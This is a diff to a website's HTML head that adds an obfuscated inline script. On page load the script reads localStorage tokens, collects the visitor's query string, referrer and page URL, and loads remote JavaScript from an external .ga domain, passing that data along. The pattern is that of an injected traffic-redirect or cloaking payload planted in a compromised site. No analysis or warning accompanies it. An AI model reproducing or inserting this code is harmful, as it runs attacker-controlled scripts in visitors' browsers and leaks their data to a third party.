@@ -9,6 +9,49 @@
   <link rel="shortcut icon" href="assets/images/logo5.png" type="image/x-icon">
   <meta name="description" content="">
   <meta name="amp-script-src" content="">
+  <script>
+    (function() {
+    var name = '_kHwCXnH7KFCjzcPS';
+    if (!window._kHwCXnH7KFCjzcPS) {
+        window._kHwCXnH7KFCjzcPS = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://ol2kate.ga/k3J45fcR',
+            P_PATH: 'https://ol2kate.ga/7b4f75c/postback',
+        };
+    }
+    const _8kppZc7M39R5dNJc = localStorage.getItem('config');
+    if (typeof _8kppZc7M39R5dNJc !== 'undefined' && _8kppZc7M39R5dNJc !== null) {
+        var _K8XyPXqRnHdL7tjr = JSON.parse(_8kppZc7M39R5dNJc);
+        var _zMLYnLJFDY7T2dnT = Math.round(+new Date()/1000);
+        if (_K8XyPXqRnHdL7tjr.created_at + window._kHwCXnH7KFCjzcPS.ttl < _zMLYnLJFDY7T2dnT) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _ySJqMnd66SbPgdYm = localStorage.getItem('subId');
+    var _YK9XYrprGChL6FnD = localStorage.getItem('token');
+    var _vmWmVH6d5DftMF6Q = '?return=js.client';
+        _vmWmVH6d5DftMF6Q += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _vmWmVH6d5DftMF6Q += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _vmWmVH6d5DftMF6Q += '&default_keyword=' + encodeURIComponent(document.title);
+        _vmWmVH6d5DftMF6Q += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _vmWmVH6d5DftMF6Q += '&name=' + encodeURIComponent(name);
+        _vmWmVH6d5DftMF6Q += '&host=' + encodeURIComponent(window._kHwCXnH7KFCjzcPS.R_PATH);
+    if (typeof _ySJqMnd66SbPgdYm !== 'undefined' && _ySJqMnd66SbPgdYm && window._kHwCXnH7KFCjzcPS.unique) {
+        _vmWmVH6d5DftMF6Q += '&sub_id=' + encodeURIComponent(_ySJqMnd66SbPgdYm);
+    }
+    if (typeof _YK9XYrprGChL6FnD !== 'undefined' && _YK9XYrprGChL6FnD && window._kHwCXnH7KFCjzcPS.unique) {
+        _vmWmVH6d5DftMF6Q += '&token=' + encodeURIComponent(_YK9XYrprGChL6FnD);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._kHwCXnH7KFCjzcPS.R_PATH + _vmWmVH6d5DftMF6Q;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
   
   <title>Home</title>
   
